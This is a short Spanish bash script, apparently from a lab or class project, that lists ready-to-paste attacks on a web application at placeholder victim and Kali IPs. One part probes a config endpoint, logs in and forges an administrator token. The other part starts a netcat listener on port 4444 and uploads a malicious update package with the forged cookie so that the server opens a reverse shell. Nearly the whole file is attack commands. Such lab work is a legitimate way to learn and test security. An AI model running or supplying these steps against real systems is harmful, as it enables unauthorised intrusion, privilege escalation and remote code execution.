#!/bin/bash
# Lista de los ataques del proyecto, listos para copiar y pegar.
# Reemplaza <IP_VICTIMA> e <IP_KALI> con las IPs reales.
VICTIMA="http://<IP_VICTIMA>:8080"
KALI="<IP_KALI>"

# ===================== Falla de criptografía (A04) =====================
# Pedimos la configuración, que nos revela cómo protege los tokens.
curl -s "$VICTIMA/api/config"

# Entramos como usuario normal y vemos la cookie con el token que se puede modificar.
curl -si -X POST "$VICTIMA/login" \
     -d "usuario=operador&password=operador123" | grep -i set-cookie

# Recuperar la llave y armar el token de administrador se hace automático con
# red-team/exploit_a04.py

# ===================== Falla de integridad (A08) ======================
# 1. En Kali, dejamos escuchando:  nc -lvnp 4444
# 2. Creamos el paquete dañino:     python3 red-team/paquete_malicioso_red_team
# 3. Lo subimos usando el token de administrador del paso anterior:
curl -s -X POST "$VICTIMA/upload-update" \
     -b "session=<TOKEN_ADMIN_FORJADO>" \
     -F "paquete=@out/malicious.tar"
# -> el servidor ejecuta update.sh y nos abre la shell hacia $KALI:4444
